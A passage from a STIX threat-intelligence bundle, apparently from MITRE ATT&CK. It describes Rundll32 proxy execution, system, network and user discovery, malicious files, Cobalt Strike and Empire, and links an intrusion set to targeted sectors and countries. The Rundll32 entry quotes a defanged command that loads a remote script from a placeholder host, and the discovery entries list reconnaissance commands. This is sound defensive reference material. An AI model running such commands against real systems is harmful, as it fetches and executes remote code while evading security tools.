                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
                    "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
                    "source_name": "LOLBAS Regsvr32"
                },
                {
                    "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
                    "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: \u201cSquiblydoo\u201d Continues Trend of Attackers Using Native OS Tools to \u201cLive off the Land\u201d. Retrieved April 9, 2018.",
                    "source_name": "Carbon Black Squiblydoo Apr 2016"
                },
                {
                    "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html",
                    "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
                    "source_name": "FireEye Regsvr32 Targeting Mongolian Gov"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Rundll32",
            "x_mitre_data_sources": [
                "File: File Metadata",
                "Process: Process Creation",
                "Command: Command Execution",
                "Module: Module Load"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-10-14T21:45:53.057Z",
            "created": "2020-01-23T18:03:46.248Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "x_mitre_defense_bypassed": [
                "Digital Certificate Validation",
                "Application control",
                "Anti-virus"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)",
            "x_mitre_contributors": [
                "Gareth Phillips, Seek Ltd.",
                "Casey Smith",
                "Ricardo Dias"
            ],
            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1218/011",
                    "external_id": "T1218.011",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
                    "source_name": "Trend Micro CPL"
                },
                {
                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
                    "source_name": "This is Security Command Line Confusion"
                },
                {
                    "url": "https://www.attackify.com/blog/rundll32_execution_order/",
                    "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
                    "source_name": "Attackify Rundll32.exe Obscurity"
                },
                {
                    "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll",
                    "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
                    "source_name": "Github NoRunDll"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "System Information Discovery",
            "x_mitre_data_sources": [
                "Instance: Instance Metadata",
                "Process: Process Creation",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "2.3",
            "modified": "2021-10-13T23:21:27.750Z",
            "created": "2017-05-31T21:31:04.307Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
            "x_mitre_platforms": [
                "Windows",
                "IaaS",
                "Linux",
                "macOS"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
            "x_mitre_contributors": [
                "Maril Vernon @shewhohacks",
                "Praetorian"
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1082",
                    "external_id": "T1082",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/312.html",
                    "external_id": "CAPEC-312",
                    "source_name": "capec"
                },
                {
                    "url": "https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/",
                    "description": "Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale | Adware Playing at Malware. Retrieved August 24, 2021.",
                    "source_name": "OSX.FairyTale"
                },
                {
                    "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
                    "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
                    "source_name": "20 macOS Common Tools and Techniques"
                },
                {
                    "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
                    "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
                    "source_name": "Amazon Describe Instance"
                },
                {
                    "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances",
                    "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.",
                    "source_name": "Google Instances Resource"
                },
                {
                    "source_name": "Microsoft Virutal Machine API",
                    "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",
                    "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "System Network Configuration Discovery",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Script: Script Execution",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "1.3",
            "modified": "2021-10-08T00:17:37.881Z",
            "created": "2017-05-31T21:30:27.342Z",
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
            "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1016",
                    "external_id": "T1016",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/309.html",
                    "external_id": "CAPEC-309",
                    "source_name": "capec"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-08-12T13:34:34.153Z",
            "name": "System Owner/User Discovery",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Command: Command Execution"
            ],
            "x_mitre_version": "1.3",
            "created": "2017-05-31T21:30:35.733Z",
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
            "description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1033",
                    "external_id": "T1033",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/577.html",
                    "external_id": "CAPEC-577",
                    "source_name": "capec"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Malicious File",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "File: File Creation"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-07-21T23:10:47.193Z",
            "created": "2020-03-11T14:49:36.954Z",
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
            "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.\n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1204/002",
                    "external_id": "T1204.002",
                    "source_name": "mitre-attack"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "malware",
            "name": "Cobalt Strike",
            "x_mitre_aliases": [
                "Cobalt Strike"
            ],
            "x_mitre_version": "1.7",
            "modified": "2021-10-18T20:08:21.958Z",
            "created": "2017-12-14T16:46:06.044Z",
            "x_mitre_platforms": [
                "Windows",
                "Linux",
                "macOS"
            ],
            "id": "malware--a7881f21-e978-4fe4-af56-92c9416a2616",
            "description": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as \u201cadversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors\u201d. Cobalt Strike\u2019s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)",
            "x_mitre_contributors": [
                "Martin Sohn Christensen, Improsec",
                "Josh Abraham"
            ],
            "labels": [
                "malware"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/software/S0154",
                    "external_id": "S0154",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "cobaltstrike manual",
                    "description": "Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017.",
                    "url": "https://cobaltstrike.com/downloads/csmanual38.pdf"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "tool",
            "name": "Empire",
            "x_mitre_aliases": [
                "Empire",
                "EmPyre",
                "PowerShell Empire"
            ],
            "x_mitre_version": "1.3",
            "modified": "2021-08-11T14:58:57.587Z",
            "created": "2019-03-11T14:13:40.648Z",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "id": "tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3",
            "description": "[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1059/001) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)",
            "labels": [
                "tool"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "source_name": "mitre-attack",
                    "external_id": "S0363",
                    "url": "https://attack.mitre.org/software/S0363"
                },
                {
                    "description": "(Citation: Github PowerShell Empire)",
                    "source_name": "EmPyre"
                },
                {
                    "description": "(Citation: Github PowerShell Empire)",
                    "source_name": "PowerShell Empire"
                },
                {
                    "source_name": "NCSC Joint Report Public Tools",
                    "description": "The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019.",
                    "url": "https://www.ncsc.gov.uk/report/joint-report-on-publicly-available-hacking-tools"
                },
                {
                    "source_name": "Github PowerShell Empire",
                    "description": "Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016.",
                    "url": "https://github.com/EmpireProject/Empire"
                },
                {
                    "source_name": "GitHub ATTACK Empire",
                    "description": "Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019.",
                    "url": "https://github.com/dstepanic/attck_empire"
                }
            ]
        },
        {
            "type": "relationship",
            "id": "relationship--6908a5b7-76ae-4e88-b835-a8850241242b",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--7119e085-8c5a-4153-bb5c-10c9eb919305"
        },
        {
            "type": "relationship",
            "id": "relationship--8757685e-87de-49c2-b9b4-569db85ac508",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--71c4726c-f45e-4e22-8616-2081a536c6bc"
        },
        {
            "type": "relationship",
            "id": "relationship--32c7101a-97f0-49a2-8093-ade30472e6f2",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--1432be4a-735c-4e9c-a974-b05a1ee2d74c"
        },
        {
            "type": "relationship",
            "id": "relationship--2db10f3c-c1ba-40aa-aba9-f22c9206624e",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--983bf966-a56b-4f3c-8637-6c56b94b3b2f"
        },
        {
            "type": "relationship",
            "id": "relationship--06f6b51c-b362-4605-afe8-bd259810c169",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--ef1f53f1-ec2b-4c2e-bcac-d1f70b1e89be"
        },
        {
            "type": "relationship",
            "id": "relationship--7d36697a-4d18-4511-b298-e9481f1a6197",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--aa25fea8-ef34-47b8-83ab-05ac3dc9326d"
        },
        {
            "type": "relationship",
            "id": "relationship--991c1fe0-0360-4e11-aeb7-31be104be8de",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--4f4306a6-c059-4518-a5df-9e71a2ac31d7"
        },
        {
            "type": "relationship",
            "id": "relationship--feef9dcc-8d46-4e80-9c1e-c48985462d63",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--9d06c6e7-4bb2-4a40-afce-3a51847ba128"
        },
        {
            "type": "relationship",
            "id": "relationship--837e601f-f90a-4047-a1a0-c3587d2d825a",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "identity--944ebdb0-97ef-463b-a3a9-52da871fcf64"
        },
        {
            "type": "relationship",
            "id": "relationship--2eb3b87a-1b7e-491e-917e-1bd372fc06c2",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "originates-from",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "location--f6f6863a-41c0-4108-8a46-880e62ba1aca"
        },
        {
            "created": "2021-03-13T20:09:21.204979Z",
            "id": "location--f6f6863a-41c0-4108-8a46-880e62ba1aca",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "China",
            "spec_version": "2.1",
            "type": "location"
        },
        {
            "type": "relationship",
            "id": "relationship--a97ca8c6-4ae2-4e6c-b56c-a427ae72c48e",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "location--59c13dbc-0886-4a54-ad89-03f46d47f0e2"
        },
        {
            "created": "2021-03-13T20:09:21.204979Z",
            "id": "location--59c13dbc-0886-4a54-ad89-03f46d47f0e2",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Australia",
            "spec_version": "2.1",
            "type": "location"
        },
        {
            "type": "relationship",
            "id": "relationship--3b83983f-3783-4b14-b26c-1381db19ef67",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "target_ref": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851"
        },
        {
            "created": "2021-03-13T20:09:21.204979Z",
            "id": "location--8b9cdfae-67fb-4939-85b3-956bb48c3851",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "United States",
            "spec_version": "2.1",
            "type": "location"
        },
        {
            "created": "2021-03-13T20:09:21.304762Z",
            "id": "identity--aa25fea8-ef34-47b8-83ab-05ac3dc9326d",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Defense sector as a target",
            "sectors": [
                "defense"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.308954Z",
            "id": "identity--944ebdb0-97ef-463b-a3a9-52da871fcf64",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Financial Services sector as a target",
            "sectors": [
                "financial-services"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.306875Z",
            "id": "identity--9d06c6e7-4bb2-4a40-afce-3a51847ba128",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Energy sector as a target",
            "sectors": [
                "energy"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.309978Z",
            "id": "identity--7119e085-8c5a-4153-bb5c-10c9eb919305",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Government sector as a target",
            "sectors": [
                "government"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.305825Z",
            "id": "identity--4f4306a6-c059-4518-a5df-9e71a2ac31d7",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Education sector as a target",
            "sectors": [
                "education"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.329303Z",
            "id": "identity--71c4726c-f45e-4e22-8616-2081a536c6bc",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Technology sector as a target",
            "sectors": [
                "technology"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.323862Z",
            "id": "identity--1432be4a-735c-4e9c-a974-b05a1ee2d74c",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Manufacturing sector as a target",
            "sectors": [
                "manufacturing"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.327165Z",
            "id": "identity--983bf966-a56b-4f3c-8637-6c56b94b3b2f",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Pharmaceuticals sector as a target",
            "sectors": [
                "pharmaceuticals"
            ],
            "spec_version": "2.1",
            "type": "identity"
        },
        {
            "created": "2021-03-13T20:09:21.330327Z",
            "id": "identity--ef1f53f1-ec2b-4c2e-bcac-d1f70b1e89be",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Telecommunications sector as a target",
            "sectors": [
                "telecommunications"
            ],
            "spec_version": "2.1",
            "type": "identity"
        }
    ]
}